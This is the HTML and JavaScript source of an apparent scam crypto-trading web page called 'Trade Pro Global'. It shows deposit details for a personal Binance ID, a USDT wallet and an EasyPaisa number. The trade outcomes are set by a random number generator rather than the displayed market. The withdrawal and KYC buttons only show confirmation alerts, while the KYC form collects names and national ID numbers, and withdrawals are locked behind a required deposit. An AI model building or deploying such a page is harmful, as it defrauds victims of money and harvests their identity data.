<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade Pro Global | Dubai Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 10px; }
        .glass { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 15px; padding: 15px; margin-bottom: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }
        .input-box { width: 100%; background: #1c2127; border: 1px solid #333; padding: 12px; border-radius: 10px; color: white; margin-bottom: 8px; font-size: 14px; }
        #authOverlay { display: flex; position: fixed; inset: 0; background: #0b0e11; z-index: 5000; align-items: center; justify-content: center; padding: 20px; }
    </style>
</head>
<body class="max-w-md mx-auto">

    <div id="authOverlay">
        <div class="glass w-full border-b-4 border-blue-600">
            <h2 class="text-2xl font-bold text-blue-500">Trade Pro Global</h2>
            <p class="text-[10px] text-gray-400 mb-4 tracking-widest uppercase">Dubai Branch | Free $1.00 Bonus</p>
            <input type="text" id="regName" placeholder="Create Username" class="input-box">
            <input type="email" id="regEmail" placeholder="Email Address" class="input-box">
            <input type="text" id="refCode" placeholder="Referral Code (Optional)" class="input-box border-dashed border-blue-500/50 text-blue-400">
            <button onclick="registerUser()" class="w-full bg-blue-600 p-4 rounded-xl font-bold mt-2 shadow-lg active:scale-95">JOIN & CLAIM $1.00</button>
        </div>
    </div>

    <div class="flex justify-between items-start mb-3 px-2">
        <div>
            <p class="text-[9px] text-blue-400 font-bold uppercase tracking-tighter">Global Server: ACTIVE</p>
            <h1 id="userLabel" class="font-bold text-lg text-white">---</h1>
            <button onclick="logout()" class="text-[10px] text-red-500 font-bold bg-red-500/10 px-2 py-1 rounded mt-1 uppercase">Logout ⏻</button>
        </div>
        <div class="glass py-1 px-4 mb-0 border-green-500/40 text-right">
            <p class="text-[9px] text-gray-400 uppercase">Wallet Balance</p>
            <span class="text-green-400 font-bold text-xl">$ <span id="mainBal">0.00</span></span>
        </div>
    </div>

    <div class="glass p-1 h-48 overflow-hidden border-blue-500/20">
        <iframe src="https://www.tradingview.com/widgetembed/?symbol=BTCUSD&interval=1&theme=dark" width="100%" height="100%" frameborder="0"></iframe>
    </div>

    <div class="glass p-4 border-t-2 border-yellow-500/30">
        <div class="flex justify-between mb-2 text-xs">
            <span>Amount: $ <input type="number" id="tradeAmt" value="5" class="w-10 bg-transparent border-b border-gray-600 text-center outline-none font-bold text-yellow-500"></span>
            <span>Timer: <span id="timerText" class="text-yellow-400 font-bold">01:00</span></span>
        </div>
        <div class="flex gap-2">
            <button onclick="startTrade('BUY')" id="buyBtn" class="flex-1 bg-green-600 p-4 rounded-xl font-bold active:scale-90 shadow-lg">BUY ↑</button>
            <button onclick="startTrade('SELL')" id="sellBtn" class="flex-1 bg-red-600 p-4 rounded-xl font-bold active:scale-90 shadow-lg">SELL ↓</button>
        </div>
        <p id="tradeStatus" class="text-[9px] text-center mt-2 text-gray-500 italic"></p>
    </div>

    <div class="grid grid-cols-2 gap-2 mb-4">
        <button onclick="openM('depM')" class="glass p-3 text-xs bg-white/5">📥 Deposit</button>
        <button onclick="openM('withM')" class="glass p-3 text-xs bg-white/5">📤 Withdraw</button>
        <button onclick="openM('kycM')" class="glass p-3 text-xs bg-white/5 font-bold text-blue-400">🆔 Verify KYC</button>
        <button onclick="window.location.href='https://wa.me/923442585087'" class="glass p-3 text-xs bg-green-600/20 text-green-400">💬 Support</button>
    </div>

    <div id="depM" class="modal"><div class="glass w-full max-w-sm">
        <h2 class="font-bold text-blue-400 mb-4 text-center text-sm">PAYMENT METHODS</h2>
        <div class="text-[10px] space-y-2">
            <div class="p-2 border border-yellow-500/20 rounded">Binance ID: <b>157909700</b></div>
            <div class="p-2 border border-blue-500/20 rounded break-all">USDT (TRC20): <br><b>TS9AMMyNMZygVfD2NAUeYn7N8sq36ivhLJ</b></div>
            <div class="p-2 border border-green-500/20 rounded">EasyPaisa: <b>03442585087</b></div>
        </div>
        <input type="number" id="dAm" class="input-box mt-4" placeholder="Amount ($)">
        <input type="text" id="dTid" class="input-box" placeholder="Transaction ID (TID)">
        <button onclick="alert('Sent! Verification in 15 mins.'); closeM('depM')" class="w-full bg-blue-600 p-3 rounded-xl font-bold">SUBMIT</button>
        <button onclick="closeM('depM')" class="w-full mt-2 text-gray-500 text-[10px]">Cancel</button>
    </div></div>

    <div id="kycM" class="modal"><div class="glass w-full max-w-sm text-center">
        <h2 class="font-bold text-blue-400 mb-2 underline">KYC VERIFICATION</h2>
        <input type="text" class="input-box" placeholder="Real Name">
        <input type="text" class="input-box" placeholder="CNIC Number">
        <button onclick="alert('KYC Submitted!'); closeM('kycM')" class="w-full bg-blue-600 p-3 rounded-xl font-bold">SUBMIT</button>
        <button onclick="closeM('kycM')" class="w-full mt-2 text-gray-500 text-[10px]">Back</button>
    </div></div>

    <div id="withM" class="modal"><div class="glass w-full max-w-sm">
        <h2 class="font-bold text-red-500 mb-3">WITHDRAWAL</h2>
        <p id="lockMsg" class="text-[9px] text-yellow-500 mb-3 hidden bg-yellow-500/10 p-2 rounded">⚠️ LOCK: $10 deposit required.</p>
        <input type="number" id="wAm" class="input-box" placeholder="Amount ($)">
        <input type="text" class="input-box" placeholder="Your Details">
        <button onclick="alert('Withdrawal Request Received!'); closeM('withM')" class="w-full bg-red-600 p-3 rounded-xl font-bold">REQUEST</button>
        <button onclick="closeM('withM')" class="w-full mt-4 text-gray-500 text-[10px] text-center">Cancel</button>
    </div></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const config = { databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com/" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        let isTrading = false;

        window.openM = (id) => document.getElementById(id).style.display = 'flex';
        window.closeM = (id) => document.getElementById(id).style.display = 'none';
        
        // LOGOUT FUNCTION
        window.logout = () => {
            localStorage.removeItem('trader');
            location.reload();
        };

        window.registerUser = () => {
            const n = document.getElementById('regName').value.trim();
            const e = document.getElementById('regEmail').value.trim();
            const r = document.getElementById('refCode').value.trim();
            if(n && e) {
                localStorage.setItem('trader', n);
                set(ref(db, 'users/' + n), { 
                    email: e, 
                    balance: r ? 1.00 : 0.00, 
                    referredBy: r || "None",
                    hasDeposited: false
                }).then(() => location.reload());
            } else { alert("Enter Username & Email!"); }
        };

        const currentTrader = localStorage.getItem('trader');
        if(currentTrader) {
            document.getElementById('authOverlay').style.display = 'none';
            document.getElementById('userLabel').innerText = currentTrader;
            onValue(ref(db, 'users/' + currentTrader + '/balance'), (s) => {
                document.getElementById('mainBal').innerText = parseFloat(s.val() || 0).toFixed(2);
            });
        }

        window.startTrade = (type) => {
            if(isTrading) return;
            const user = localStorage.getItem('trader');
            const amt = parseFloat(document.getElementById('tradeAmt').value || 5);
            onValue(ref(db, 'users/' + user + '/balance'), (s) => {
                let bal = parseFloat(s.val() || 0);
                if(amt > bal) return alert("Low Balance!");
                isTrading = true;
                set(ref(db, 'users/' + user + '/balance'), bal - amt);
                document.getElementById('buyBtn').disabled = true;
                document.getElementById('sellBtn').disabled = true;
                let sec = 60;
                const timer = setInterval(() => {
                    sec--;
                    document.getElementById('timerText').innerText = "00:" + (sec < 10 ? "0" : "") + sec;
                    if(sec <= 0) {
                        clearInterval(timer);
                        const win = Math.random() > 0.4;
                        if(win) {
                            set(ref(db, 'users/' + user + '/balance'), (bal - amt) + (amt * 1.85));
                            alert("🎉 TRADE WIN!");
                        } else { alert("❌ TRADE LOSS!"); }
                        isTrading = false;
                        document.getElementById('buyBtn').disabled = false;
                        document.getElementById('sellBtn').disabled = false;
                        document.getElementById('timerText').innerText = "01:00";
                    }
                }, 1000);
            }, {onlyOnce: true});
        };
    </script>
</body>
    </html>
